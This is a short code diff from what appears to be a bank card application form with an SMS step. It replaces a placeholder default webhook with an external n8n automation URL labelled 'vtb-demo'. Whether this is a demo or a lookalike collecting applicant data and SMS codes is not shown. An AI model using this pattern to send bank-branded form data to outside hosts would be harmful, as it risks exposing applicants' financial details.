@@ -16,7 +16,7 @@ import {
 } from "@/components/ui/dialog";
 
 const WEBHOOK_STORAGE_KEY = 'bank_webhook_url';
-const DEFAULT_WEBHOOK_URL = 'https://your-webhook-url.com/api/card-application';
+const DEFAULT_WEBHOOK_URL = 'https://n8n.okta-solutions.com/webhook/vtb-demo';
 
 type Step = 'form' | 'sms' | 'success';
 
